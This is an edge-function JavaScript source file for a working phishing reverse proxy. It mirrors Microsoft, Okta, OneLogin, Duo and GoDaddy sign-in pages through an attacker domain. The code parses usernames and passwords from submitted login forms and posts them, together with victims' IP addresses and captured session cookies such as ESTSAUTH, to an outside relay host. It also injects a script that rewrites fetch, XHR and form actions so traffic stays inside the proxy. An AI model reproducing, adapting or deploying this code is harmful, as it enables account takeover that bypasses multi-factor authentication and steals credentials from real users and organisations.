export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'esctx', 'CCState', 'buid', 'fpc'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  
  let modified = false;
  while (params.has('path')) {
    params.delete('path');
    modified = true;
  }
  
  for (const [key, value] of params) {
    if (!value || value === 'undefined' || value === 'null') {
      params.delete(key);
    }
  }
  
  const result = params.toString();
  return result ? '?' + result : '';
}

// ==================== CRITICAL FIX: RECURSIVE URL CLEANER ====================

function cleanRecursivePath(pathname) {
  // Pattern: /_p/YOUR_DOMAIN/_p/REAL_UPSTREAM/...
  const recursivePattern = new RegExp(`^(_p\\/${YOUR_DOMAIN.replace(/\./g, '\\.')}\\/)+`, 'g');
  
  let cleaned = pathname.replace(recursivePattern, '');
  
  if (!cleaned.startsWith(PROXY_PREFIX) && cleaned !== '/') {
    const firstSegment = cleaned.split('/')[0];
    if (firstSegment && firstSegment.includes('.')) {
      cleaned = PROXY_PREFIX + cleaned;
    }
  }
  
  return cleaned;
}

function extractUpstreamFromPath(pathname) {
  const cleaned = cleanRecursivePath(pathname);
  
  if (!cleaned.startsWith(PROXY_PREFIX)) {
    return null;
  }
  
  const withoutPrefix = cleaned.slice(PROXY_PREFIX.length);
  const firstSlash = withoutPrefix.indexOf('/');
  
  if (firstSlash === -1) {
    return {
      domain: withoutPrefix,
      path: '/'
    };
  } else {
    return {
      domain: withoutPrefix.slice(0, firstSlash),
      path: withoutPrefix.slice(firstSlash)
    };
  }
}

// ==================== FIXED UPSTREAM DETECTION ====================

function getUpstreamInfo(pathname, search) {
  const cleanedPath = cleanRecursivePath(pathname);
  
  if (cleanedPath.startsWith(PROXY_PREFIX)) {
    const extracted = extractUpstreamFromPath(cleanedPath);
    
    if (!extracted) {
      return {
        upstream: INITIAL_UPSTREAM,
        type: 'microsoft',
        path: '/',
        search: '',
        isProxied: false,
        error: 'extraction_failed'
      };
    }
    
    const { domain, path } = extracted;
    
    // CRITICAL: Never proxy our own domain
    if (domain === YOUR_DOMAIN || domain.endsWith(YOUR_DOMAIN)) {
      console.log(`[BLOCKED] Attempt to proxy own domain: ${domain}`);
      return {
        upstream: INITIAL_UPSTREAM,
        type: 'microsoft',
        path: '/',
        search: '',
        isProxied: false,
        isRecursiveBlocked: true
      };
    }
    
    const provider = IDENTITY_PROVIDERS[domain];
    
    return {
      upstream: domain,
      type: provider ? provider.type : 'unknown',
      path: path,
      search: cleanQueryString(search),
      isProxied: true
    };
  }
  
  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    search: cleanQueryString(search),
    isProxied: false
  };
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

// ==================== FIXED LOCATION REWRITING ====================

function parseEmbeddedUrl(path) {
  // Match: /common/https://domain.com or /common/https:/domain.com
  const embeddedPattern = /\/(https?:)\/([^\/]+)(.*)/;
  const match = path.match(embeddedPattern);
  
  if (match) {
    const protocol = match[1];
    const domain = match[2];
    const rest = match[3] || '';
    
    const fullUrl = `${protocol}//${domain}${rest}`;
    
    try {
      const url = new URL(fullUrl);
      return {
        isEmbedded: true,
        beforeEmbedded: path.slice(0, path.indexOf(match[0])),
        embeddedUrl: url,
        fullMatch: match[0]
      };
    } catch (e) {
      return { isEmbedded: false };
    }
  }
  
  return { isEmbedded: false };
}

function rewriteLocation(location, currentUpstream) {
  try {
    const url = new URL(location);
    
    // Already our domain? Don't rewrite
    if (url.hostname === YOUR_DOMAIN || url.hostname.endsWith(`.${YOUR_DOMAIN}`)) {
      if (url.pathname.includes(PROXY_PREFIX)) {
        return location;
      }
      return location;
    }
    
    if (shouldProxyDomain(url.hostname)) {
      const cleanSearch = cleanQueryString(url.search);
      const embedded = parseEmbeddedUrl(url.pathname);
      
      if (embedded.isEmbedded) {
        const emb = embedded.embeddedUrl;
        
        if (emb.hostname === YOUR_DOMAIN) {
          const microsoftPath = embedded.beforeEmbedded;
          const targetPath = emb.pathname + emb.search;
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${microsoftPath}${targetPath}`;
        }
        
        if (shouldProxyDomain(emb.hostname)) {
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${emb.hostname}${emb.pathname}${cleanSearch}`;
        }
      }
      
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanSearch}`;
    }
    
    return location;
    
  } catch (e) {
    // Relative URL
    if (location.startsWith('/')) {
      const embedded = parseEmbeddedUrl(location);
      
      if (embedded.isEmbedded) {
        const emb = embedded.embeddedUrl;
        
        if (emb.hostname === YOUR_DOMAIN) {
          return emb.pathname + emb.search;
        }
        
        if (shouldProxyDomain(emb.hostname)) {
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${emb.hostname}${emb.pathname}${emb.search}`;
        }
      }
      
      if (currentUpstream) {
        return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${location}`;
      }
    }
    
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => p === '.*' ? true : cookieString.toLowerCase().includes(p.toLowerCase()));
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    const jsonData = JSON.parse(bodyText);
    user = jsonData.username || jsonData.email || jsonData.user || jsonData.login;
    pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass;
    if (user && pass) return { user, pass };
  } catch (e) {}
  
  const pairs = bodyText.split('&');
  for (const pair of pairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;
    const decoded = decodeURIComponent(value.replace(/\+/g, ' '));
    if (['login', 'loginfmt', 'username', 'email', 'user'].includes(key)) user = decoded;
    if (['passwd', 'password', 'pwd', 'pass'].includes(key)) pass = decoded;
  }
  return { user, pass };
}

function generateInterceptorScript(upstreamDomain, currentPath) {
  const basePath = currentPath.replace(/\/[^\/]*$/, '/');
  return `<script>(function(){
    const P='${PROXY_PREFIX}',D='${YOUR_DOMAIN}',U='${upstreamDomain}',B='${basePath}';
    function r(u){if(!u)return u;if(u.includes(D+P))return u;if(u.startsWith('http')){try{let h=new URL(u).hostname;if(['login.microsoftonline.com','login.live.com','office.com','microsoft.com','msauth.net','okta.com','godaddy.com','secureserver.net'].some(d=>h.includes(d)))return u.replace(/^https?:\\/\\/[^\\/]+/,'https://'+D+P+h)}catch(e){}}if(u.startsWith('//')){let h=u.split('/')[2];if(h&&r('https://'+h)!==u)return'https://'+D+P+h+u.slice(2+h.length)}if(u.startsWith('/'))return u.startsWith(P)?u:'https://'+D+P+U+u;return'https://'+D+P+U+B+u}
    const f=window.fetch;window.fetch=function(u,o){try{return f.call(this,typeof u==='string'?r(u):u instanceof Request?new Request(r(u.url),u):u,o)}catch(e){return f.call(this,u,o)}};
    const x=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u,a,user,pwd){try{return x.call(this,m,r(u),a,user,pwd)}catch(e){return x.call(this,m,u,a,user,pwd)}};
    const s=HTMLFormElement.prototype.submit;HTMLFormElement.prototype.submit=function(){if(this.action)this.action=r(this.action);return s.call(this)};
    document.addEventListener('click',function(e){let f=e.target.closest('form');if(f&&f.action)f.action=r(f.action)},true);
  })();</script>`;
}

// ==================== CRITICAL FIX: SAFE HEADER HANDLING ====================

/**
 * Create completely new headers from scratch - never modify the original
 */
function createResponseHeaders(resp, options = {}) {
  const newHeaders = new Headers();
  
  // Copy only safe, necessary headers
  const headersToCopy = [
    'content-type',
    'content-length',
    'content-encoding',
    'cache-control',
    'expires',
    'etag',
    'last-modified',
    'vary'
  ];
  
  headersToCopy.forEach(name => {
    const value = resp.headers.get(name);
    if (value) {
      newHeaders.set(name, value);
    }
  });
  
  // Add CORS headers
  newHeaders.set('access-control-allow-origin', '*');
  newHeaders.set('access-control-allow-credentials', 'true');
  
  // Add custom headers from options
  if (options.location) {
    newHeaders.set('location', options.location);
  }
  
  if (options.setCookies) {
    options.setCookies.forEach(cookie => {
      newHeaders.append('set-cookie', cookie);
    });
  }
  
  return newHeaders;
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = getUpstreamInfo(url.pathname, url.search);
  
  // Handle recursive block - redirect to clean root
  if (info.isRecursiveBlocked) {
    console.log(`[REDIRECT] Recursive blocked, redirecting to /`);
    // CRITICAL FIX: Use manual redirect with custom headers instead of Response.redirect()
    const redirectHeaders = new Headers();
    redirectHeaders.set('location', `https://${YOUR_DOMAIN}/`);
    return new Response(null, { 
      status: 302, 
      headers: redirectHeaders 
    });
  }
  
  const upstreamDomain = info.upstream;
  const upstreamUrl = 'https://' + upstreamDomain + info.path + info.search;
  
  console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  const headers = new Headers();
  const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
  
  clientHeaders.forEach(h => {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  });

  headers.set('Host', upstreamDomain);
  
  const originalReferer = request.headers.get('referer');
  const originalOrigin = request.headers.get('origin');
  
  if (!originalReferer) {
    headers.set('Referer', 'https://' + upstreamDomain + '/');
  }
  if (!originalOrigin) {
    headers.set('Origin', 'https://' + upstreamDomain);
  }

  ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
   'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'].forEach(h => headers.delete(h));

  let bodyText = null;
  let requestBody = null;

  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] ${user.substring(0,5)}... on ${info.type}`);
        await sendToVercel('credentials', { type: 'creds', ip, user, pass, platform: info.type, url: url.href });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        formData.append('ip', ip);
        formData.append('type', 'credentials');
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers,
      body: requestBody,
      redirect: 'manual'
    });

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const rewrittenLoc = rewriteLocation(loc, upstreamDomain);
        const redirectHeaders = createResponseHeaders(resp, { location: rewrittenLoc });
        return new Response(null, { status: resp.status, headers: redirectHeaders });
      }
    }

    // Prepare cookies
    const cookies = resp.headers.getSetCookie?.() || [];
    let cookieStr = '';
    let shouldCapture = false;
    const modifiedCookies = [];

    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
      const isPostLogin = request.method === 'POST' && info.path.includes('/SAS/ProcessAuth');
      shouldCapture = isPostLogin || (resp.status === 302 && hasAuth);

      cookies.forEach(cookie => {
        if (!cookie) return;
        
        let modifiedCookie = cookie;
        
        // Replace upstream domain with proxy domain prefix pattern
        modifiedCookie = modifiedCookie.replace(
          new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'), 
          `${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}`
        );
        
        // Also replace other provider domains in cookies
        Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
          if (domain !== upstreamDomain) {
            modifiedCookie = modifiedCookie.replace(
              new RegExp(domain.replace(/\./g, '\\.'), 'g'),
              `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
            );
          }
        });
        
        // Ensure Secure and SameSite=None
        if (!modifiedCookie.includes('Secure')) modifiedCookie += '; Secure';
        if (!modifiedCookie.includes('SameSite')) modifiedCookie += '; SameSite=None';
        
        modifiedCookies.push(modifiedCookie);
      });
    }

    if (shouldCapture && cookieStr) {
      await exfiltrateCookies(cookieStr, ip, info.type, url.href);
    }

    // Create final headers
    const finalHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });

    const ct = resp.headers.get('content-type') || '';
    
    if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
      let text = await resp.text();
      
      if (ct.includes('text/html')) {
        const script = generateInterceptorScript(upstreamDomain, info.path);
        text = text.replace('<head>', '<head>' + script)
                   .replace('<html>', '<html>' + script);
        if (!text.includes(script)) text = script + text;
      }

      // Simple string replacement
      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
        text = text.split(domain).join(replacement);
      });

      if (ct.includes('text/html')) {
        const currentDir = info.path.replace(/\/[^\/]*$/, '/');
        
        // Handle relative paths for src/href
        text = text.replace(/(src|href)="\/([^"]*)"/gi, (m, attr, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:')) return m;
          return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
        });
        
        // Form actions
        text = text.replace(/action="\/([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
        text = text.replace(/action="(?!\/|https?:|#|data:)([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${currentDir}$1"`);
        
        // CSS url()
        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (m, path) => {
          if (path.startsWith('_p/')) return m;
          return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path})`;
        });
      }

      return new Response(text, { status: resp.status, headers: finalHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: finalHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    // CRITICAL FIX: Create new headers for error response too
    const errorHeaders = new Headers();
    errorHeaders.set('content-type', 'application/json');
    return new Response(JSON.stringify({ error: 'Proxy Error', message: err.message }), 
                       { status: 502, headers: errorHeaders });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
